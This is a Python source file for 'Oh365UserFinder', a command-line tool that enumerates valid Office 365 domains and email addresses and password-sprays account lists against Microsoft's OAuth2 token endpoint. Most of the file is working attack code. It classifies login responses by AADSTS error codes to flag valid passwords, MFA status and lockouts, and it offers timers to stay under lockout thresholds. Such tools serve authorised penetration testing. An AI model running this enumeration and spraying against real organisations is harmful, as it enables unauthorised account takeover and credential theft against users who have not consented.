#!/usr/bin/python3

import requests as o365request
import argparse
import time
import re
import textwrap
import sys
from colorama import Fore, Style, init
from functions.general import banner
from functions.enum import enum_domain, single_email, email_list


def definitions():
    global info, close, success, fail
    info, fail, close, success = (
        Fore.YELLOW + Style.BRIGHT,
        Fore.RED + Style.BRIGHT,
        Style.RESET_ALL,
        Fore.GREEN + Style.BRIGHT,
    )


def options():
    opt_parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """---Validate a Domain Name in O365---
python3 Oh365Finder.py -d mayorsec.com\n
---Validate a single email---
python3 Oh365UserFinder.py -e test@test.com\n
---Validate a list of emails and write to file---
python3 Oh365UserFinder.py -r testemails.txt -w valid.txt\n
---Validate a list of emails, write to file and timeout between requests---
python3 Oh365UserFinder.py -r emails.txt -w validemails.txt -t 30\n
---Validate a list of emails and write to CSV---
python3 Oh365UserFinder.py -r emails.txt -c validemails.csv -t 30\n
---Password Spray a list of emails using GRAPH--- (Can be used to identify valid account credentials with MFA enabled)
python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname>\n
---Password Spray a list of emails using GRAPH with lockout policy timer---
python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname> --lockout <time>\n

"""
        ),
    )
    opt_parser.add_argument("-d", "--domain", help="Validate if a domain exists")
    opt_parser.add_argument(
        "-e", "--email", help="Runs o365UserFinder against a single email"
    )
    opt_parser.add_argument("-r", "--read", help="Reads email addresses from file")
    opt_parser.add_argument(
        "-t", "--timeout", help="Set timeout between checks to avoid false positives"
    )
    opt_parser.add_argument("-w", "--write", help="Writes valid emails to text file")
    opt_parser.add_argument("-c", "--csv", help="Writes valid emails to a .csv file")
    opt_parser.add_argument(
        "-v", "--verbose", help="Prints output verbosely", action="store_true"
    )
    opt_parser.add_argument(
        "-gs",
        "--pwspray",
        help="Password sprays a list of accounts using GRAPH",
        action="store_true",
    )
    opt_parser.add_argument(
        "-l", "--lockout", help="Sets the lockout timer if known (in minutes)"
    )

    # opt_parser.add_argument(
    #     '-ps', '--pwspray', help='Password sprays a list of accounts using RST', action='store_true')
    opt_parser.add_argument("-p", "--password", help="Password to be tested")
    opt_parser.add_argument("-el", "--elist", help="Valid emails to be tested")
    global args
    args = opt_parser.parse_args()
    if len(sys.argv) == 1:
        opt_parser.print_help()
        opt_parser.exit()


ms_url = "https://login.microsoftonline.com/common/GetCredentialType"


def main():
    if args.timeout is not None:
        print(
            info
            + f"[info] Timeout set to {args.timeout} seconds between requests.\n"
            + close
        )
    counter = 0
    timeout_counter = 0
    print(
        Fore.YELLOW
        + Style.BRIGHT
        + f"\n[info] Starting Oh365 User Finder at {time.ctime()}\n"
        + Style.RESET_ALL
    )
    if args.email is not None:
        single_email(args, o365request, ms_url)

    elif args.read is not None:
        email_list(args, o365request, ms_url, counter, timeout_counter)

    elif args.domain is not None:
        enum_domain(args, o365request)

    elif args.pwspray:
        lockout_counter = 0
        with open(args.elist) as input_emails:
            for line in input_emails:
                email_line = line.split()
                email = " ".join(email_line)
                password = args.password
                s = o365request.session()
                body = (
                    "grant_type=password&password="
                    + password
                    + "&client_id=4345a7b9-9a63-4910-a426-35363201d503&username="
                    + email
                    + "&resource=https://graph.windows.net&client_info=1&scope=openid"
                )
                requestURL = "https://login.microsoft.com/common/oauth2/token"
                request = o365request.post(requestURL, data=body)
                response = request.text
                valid_response = re.search("53003", response)
                account_doesnt_exist = re.search("50034", response)
                account_invalid_password = re.search("50126", response)
                account_disabled = re.search("The user account is disabled", response)
                valid_response1 = re.search("7000218", response)
                password_expired = re.search("50055", response)
                account_locked_out = re.search("50053", response)
                mfa_true = re.search("50076", response)
                mfa_true1 = re.search("50079", response)
                desktopsso_response = re.search(
                    '{"DesktopSsoEnabled":true,"UserTenantBranding"}',
                    response,
                )
                desktop_response_50005 = re.search(
                    "AADSTS50005", response
                )  # This checks for error code AADSTS50005 - User tried to log in to a device from a platform (Unknown) that's currently not supported through Conditional Access policy.
                conditional_access = re.search("50158", response)
                if args.verbose:
                    print(
                        "\n",
                        email,
                        s,
                        email_line,
                        email,
                        body,
                        request,
                        response,
                        valid_response,
                        account_doesnt_exist,
                        account_invalid_password,
                        account_disabled,
                        valid_response1,
                        password_expired,
                        account_locked_out,
                        mfa_true,
                        mfa_true1,
                        desktopsso_response,
                        conditional_access,
                        "\n",
                    )
                if valid_response:
                    counter = counter + 1
                    b = success + "Result - " + " " * 1 + "VALID PASSWORD! [+]"
                    print(success + f"[+] {email:44} {b}" + close)
                if valid_response1:
                    counter = counter + 1
                    b = success + "Result - " + " " * 15 + "VALID PASSWORD! [+]"
                    print(success + f"[+] {email:44} {b}" + close)
                if account_doesnt_exist:
                    b = " Result - " + " " * 14 + "Invalid Account! [-]"
                    print(fail + f"[-] {email:43} {b}" + close)
                if account_disabled:
                    b = "Result - " + " " * 13 + "Account disabled. [!]"
                    print(info + f"[!] {email:44} {b}" + close)
                if account_locked_out:
                    b = "Result - " + " " * 13 + "LOCKOUT DETECTED! [!]"
                    print(info + f"[!] {email:44} {b}" + close)
                    lockout_counter = lockout_counter + 1
                    if lockout_counter >= 3:
                        print(info + "[!] Warning - three lockouts detected.\n" + close)
                        lockout_answer = input(
                            "Would you like to wait a while before continuing? (y/n)"
                        )
                        if lockout_answer.lower() == "y":
                            print(info + "[!] Waiting ten minutes before continuing.")
                            time.sleep(600)
                            lockout_counter = 0
                            continue
                        else:
                            lockout_counter = 0
                            continue

                if desktopsso_response or desktop_response_50005:
                    counter = counter + 1
                    a = email
                    b = " Result -  " + " " * 8 + "Desktop SSO Enabled [!]"
                    print(info + f"[!] {a:43} {b} " + close)
                if account_invalid_password:
                    a = email
                    b = " Result - " + " " * 10 + "Invalid Credentials! [-]"
                    print(fail + f"[-] {email:43} {b}" + close)
                if password_expired:
                    a = email
                    b = " Result - " + " " * 7 + "Expired - Try Resetting [!]"
                    counter = counter + 1
                    print(info + f"[!] {email:43} {b}" + close)
                if mfa_true:
                    counter = counter + 1
                    a = email
                    b = "Result -   VALID PASSWORD - MFA ENABLED [+]"
                    print(success + f"[+] {email:44} {b}" + close)
                if mfa_true1:
                    counter = counter + 1
                    a = email
                    b = "Result - MFA ENABLED NOT YET CONFIGURED [+]"
                    print(success + f"[+] {email:44} {b}" + close)
                if conditional_access:
                    counter = counter + 1
                    a = email
                    b = "Result - Duo MFA or other conditional access [+]"
                    print(success + f"[!] {email:44} {b}" + close)
                if args.timeout is not None:
                    time.sleep(int(args.timeout))

            if counter == 0:
                print(fail + "\n[-] There were no valid logins found. [-]" + close)
                print(info + f"\n[info] Scan completed at {time.ctime()}" + close)
            elif counter == 1:
                print(
                    info
                    + "\n[info] Oh365 User Finder discovered one valid credential pair."
                    + close
                )
                print(info + f"\n[info] Scan completed at {time.ctime()}" + close)
            else:
                print(
                    info
                    + f"\n[info] Oh365 User Finder discovered {counter} valid credential pairs.\n"
                    + close
                )
                print(info + f"\n[info] Scan completed at {time.ctime()}" + close)
    else:
        sys.exit()


def new_func():
    return 60


if __name__ == "__main__":
    try:
        init()
        definitions()
        banner()
        options()
        main()

    except KeyboardInterrupt:
        print("\nYou either fat fingered this, or meant to do it. Either way, goodbye!")
        quit()
